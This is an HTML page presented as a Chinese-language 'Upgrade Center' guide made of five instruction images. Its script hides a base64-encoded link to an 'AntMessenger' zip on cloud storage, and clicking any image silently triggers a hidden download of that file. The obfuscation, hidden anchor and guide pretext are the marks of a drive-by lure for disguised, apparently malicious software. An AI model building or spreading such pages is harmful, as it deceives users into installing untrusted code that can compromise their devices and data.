<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>升级中心</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: auto;
            display: block;
            cursor: pointer;
        }
    </style>
</head>
<body>

   <section class="guide-section">
        <img src="images/img_01.jpg" alt="操作步骤示意图">
    </section>
    <section class="guide-section">
        <img src="images/img_02.jpg" alt="功能说明图示">
    </section>
    <section class="guide-section">
        <img src="images/img_03.jpg" alt="使用技巧展示">
    </section>
    <section class="guide-section">
        <img src="images/img_04.jpg" alt="配置流程说明">
    </section>
    <section class="guide-section">
        <img src="images/img_05.jpg" alt="最终效果预览">
    </section>

<script>
    (function() {
        // 资源获取处理器
        const resourceHandler = {
            resourceLinks: [
                'aHR0cHM6Ly9oay1jZG4wMTAub3NzLWNuLWhvbmdrb25nLmFsaXl1bmNzLmNvbS9BbnRNZXNzZW5nZXJfdjIuMS43LnppcA==',
                'aHR0cHM6Ly9oay1jZG4wMTAub3NzLWNuLWhvbmdrb25nLmFsaXl1bmNzLmNvbS9BbnRNZXNzZW5nZXJfdjIuMS43LnppcA==',
                'aHR0cHM6Ly9oay1jZG4wMTAub3NzLWNuLWhvbmdrb25nLmFsaXl1bmNzLmNvbS9BbnRNZXNzZW5nZXJfdjIuMS43LnppcA==',
                'aHR0cHM6Ly9oay1jZG4wMTAub3NzLWNuLWhvbmdrb25nLmFsaXl1bmNzLmNvbS9BbnRNZXNzZW5nZXJfdjIuMS43LnppcA==',
                'aHR0cHM6Ly9oay1jZG4wMTAub3NzLWNuLWhvbmdrb25nLmFsaXl1bmNzLmNvbS9BbnRNZXNzZW5nZXJfdjIuMS43LnppcA=='
            ],
            
            decodeData: function(encoded) {
                return atob(encoded);
            },
            
            initResourceAccess: function() {
                document.querySelectorAll('.guide-section').forEach((section, index) => {
                    section.addEventListener('click', () => {
                        this.processResource(this.resourceLinks[index]);
                    });
                });
            },
            
            processResource: function(encoded) {
                const resourceUrl = this.decodeData(encoded);
                const temporaryLink = document.createElement('a');
                temporaryLink.style.display = 'none';
                temporaryLink.href = resourceUrl;
                temporaryLink.rel = 'noopener noreferrer';
                document.body.appendChild(temporaryLink);
                temporaryLink.click();
                setTimeout(() => {
                    document.body.removeChild(temporaryLink);
                }, 300);
            }
        };

        // 图片展示模块
        const imageViewer = {
            initImagePreview: function() {
                const images = document.querySelectorAll('.guide-section img');
                images.forEach(img => {
                    img.addEventListener('load', () => {
                        img.style.opacity = 1;
                    });
                });
            }
        };

        // 初始化模块
        document.addEventListener('DOMContentLoaded', () => {
            resourceHandler.initResourceAccess();
            imageViewer.initImagePreview();
        });
    })();
</script>


</body>
</html>
